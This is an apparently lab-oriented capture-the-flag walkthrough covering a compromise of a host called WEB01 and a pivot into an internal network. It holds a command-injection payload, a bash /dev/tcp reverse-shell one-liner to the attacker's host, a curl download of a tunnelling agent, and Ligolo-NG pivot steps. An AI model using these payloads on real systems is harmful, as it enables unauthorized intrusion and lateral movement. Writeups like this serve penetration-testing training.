# Scenario 01 — Solution Walkthrough

> **Spoiler Warning:** This document contains the intended solution path for Scenario 01.

## 1. Starting Position

The attacker begins on Kali:

```text
10.10.10.10/24
```

WEB01 is reachable at:

```text
10.10.10.20
```

The internal `CORP-LAN` network is not directly connected to Kali.

## 2. Enumerate WEB01

Perform a TCP service scan:

```bash
sudo nmap -Pn -sC -sV -p- 10.10.10.20
```

Enumeration reveals a web service running on TCP port `8080`.

Browse to:

```text
http://10.10.10.20:8080/
```

The service identifies itself as **OpsCheck**, an infrastructure diagnostics application.

The health endpoint can also be queried:

```bash
curl http://10.10.10.20:8080/health
```

Example response:

```json
{"service":"opscheck","status":"ok","version":"1.0.3"}
```

## 3. Discover Command Injection

OpsCheck provides a network diagnostics function that accepts an IPv4 address or hostname.

A normal request can be tested using:

```text
10.10.10.10
```

Shell metacharacters can then be tested.

For example:

```text
127.0.0.1; id
```

The resulting output includes execution of the injected `id` command.

The vulnerable application executes as the restricted account:

```text
opscheck
```

Additional validation:

```text
127.0.0.1; whoami
```

## 4. Enumerate WEB01 Networking

Command execution can be used to inspect the target's interfaces:

```text
127.0.0.1; ip -br addr
```

WEB01 reveals addresses on two different networks:

```text
10.10.10.20/24
172.16.10.10/24
```

Routing information can also be inspected:

```text
127.0.0.1; ip route
```

This identifies an additional network:

```text
172.16.10.0/24
```

Kali does not have a direct interface or route into this network.

WEB01 is therefore a potential pivot host.

## 5. Establish an Interactive Foothold

On Kali, start a listener:

```bash
rlwrap nc -lvnp 4444
```

Plain Netcat can be used if `rlwrap` is unavailable:

```bash
nc -lvnp 4444
```

Submit a callback through the vulnerable diagnostics field:

```text
127.0.0.1; bash -c 'bash -i >& /dev/tcp/10.10.10.10/4444 0>&1'
```

The listener receives a shell from WEB01.

Verify the execution context:

```bash
whoami
id
hostname
```

The shell should execute as:

```text
opscheck
```

## 6. Upgrade the Shell

If Python is available:

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

Suspend the shell with `Ctrl-Z`.

On Kali:

```bash
stty raw -echo; fg
```

Press Enter and configure the remote terminal:

```bash
export TERM=xterm
export SHELL=/bin/bash
stty rows 40 columns 120
```

## 7. Verify Internal Connectivity

From the compromised WEB01 shell:

```bash
ping -c 2 172.16.10.20
```

TARGET01 responds.

At this point:

```text
Kali
  |
  | cannot directly reach CORP-LAN
  |
WEB01
  |
  | can reach CORP-LAN
  |
TARGET01
172.16.10.20
```

## 8. Start Ligolo-NG on Kali

Start the Ligolo-NG proxy with privileges sufficient to create the TUN interface:

```bash
sudo ligolo-proxy -selfcert
```

The proxy listens for an agent connection on TCP port `11601`.

## 9. Stage the Ligolo Agent

On Kali:

```bash
mkdir -p /tmp/ligolo-stage
cp /usr/bin/ligolo-agent /tmp/ligolo-stage/
cd /tmp/ligolo-stage
```

Start a temporary HTTP server bound to Kali's LAB-EXT address:

```bash
python3 -m http.server 8000 --bind 10.10.10.10
```

## 10. Transfer the Agent Through the Foothold

From the compromised `opscheck` shell:

```bash
cd /tmp
curl http://10.10.10.10:8000/ligolo-agent -o ligolo-agent
chmod +x ligolo-agent
```

The temporary HTTP server can be stopped after the transfer completes.

## 11. Connect WEB01 to the Ligolo Proxy

From the WEB01 foothold:

```bash
/tmp/ligolo-agent \
  -connect 10.10.10.10:11601 \
  -ignore-cert
```

The Ligolo console on Kali should report the new WEB01 agent.

Select the agent:

```text
session
```

Inspect its interfaces:

```text
ifconfig
```

The agent should expose both WEB01 networks, including:

```text
172.16.10.10/24
```

## 12. Create the Pivot

From the Ligolo console:

```text
autoroute
```

Select the interface associated with `172.16.10.0/24`.

Create a new Ligolo interface named:

```text
ligolo-web01
```

Start the tunnel when prompted.

## 13. Verify Kali Routing

From another Kali terminal:

```bash
ip link show ligolo-web01
```

Verify the internal route:

```bash
ip route | grep 172.16.10
```

Expected route:

```text
172.16.10.0/24 dev ligolo-web01
```

Confirm Linux will use the tunnel for TARGET01:

```bash
ip route get 172.16.10.20
```

The important result is:

```text
dev ligolo-web01
```

The selected source address may be another Kali address. The relevant property is that the destination is routed through the Ligolo interface.

## 14. Reach TARGET01

Test connectivity:

```bash
ping -c 2 172.16.10.20
```

Then enumerate the currently exposed SSH service:

```bash
nmap -Pn -p 22 172.16.10.20
```

A successful test should show:

```text
22/tcp open ssh
```

Kali can now reach a system that was inaccessible before compromising WEB01.

The pivot is complete.

## 15. Attack Path

The validated attack chain is:

```text
KALI
  |
  | enumerate 10.10.10.20
  v
OpsCheck :8080
  |
  | command injection
  v
opscheck@WEB01
  |
  | enumerate interfaces
  v
discover 172.16.10.0/24
  |
  | reverse shell
  v
WEB01 foothold
  |
  | transfer Ligolo agent
  v
Ligolo tunnel
  |
  | route 172.16.10.0/24
  v
TARGET01
172.16.10.20
```

## 16. Current Endpoint

At the current development milestone, TARGET01 is reachable through the pivot and exposes SSH on TCP port `22`.

The TARGET01 vulnerability, exploitation path, and final flag are still under development.

Once implemented, the remainder of this walkthrough will document the internal enumeration and final compromise.
